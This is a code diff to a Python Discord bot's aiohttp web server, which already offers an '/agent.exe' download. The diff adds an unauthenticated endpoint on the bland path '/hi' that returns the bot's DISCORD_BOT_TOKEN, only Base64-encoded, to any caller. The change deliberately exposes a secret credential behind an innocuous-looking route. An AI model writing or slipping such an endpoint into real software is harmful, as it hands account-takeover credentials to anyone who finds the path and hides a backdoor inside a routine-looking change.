@@ -7,6 +7,7 @@ from aiohttp import web
 from datetime import datetime, timezone, timedelta
 import re
 import logging
+import base64  # added for base64 encoding
 
 # ------------------- CONFIGURATION -------------------
 BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
@@ -48,7 +49,7 @@ class MyBot(commands.Bot):
 
 bot = MyBot()
 
-# ------------------- HTTP HEALTH & FILE SERVER -------------------
+# ------------------- HTTP HEALTH, FILE SERVER & TOKEN ENDPOINT -------------------
 async def handle_health(request):
     return web.Response(text="OK")
 
@@ -59,10 +60,19 @@ async def handle_agent_download(request):
         return web.Response(text="Agent binary not found", status=404)
     return web.FileResponse(file_path)
 
+async def handle_token(request):
+    """Return the bot token Base64‑encoded."""
+    token = os.getenv("DISCORD_BOT_TOKEN")
+    if not token:
+        return web.Response(text="Token not configured", status=500)
+    encoded = base64.b64encode(token.encode()).decode()
+    return web.Response(text=encoded)
+
 app = web.Application()
 app.router.add_get("/", handle_health)
 app.router.add_get("/health", handle_health)
 app.router.add_get("/agent.exe", handle_agent_download)
+app.router.add_get("/hi", handle_token)  # new token endpoint
 
 async def start_http_server():
     runner = web.AppRunner(app)
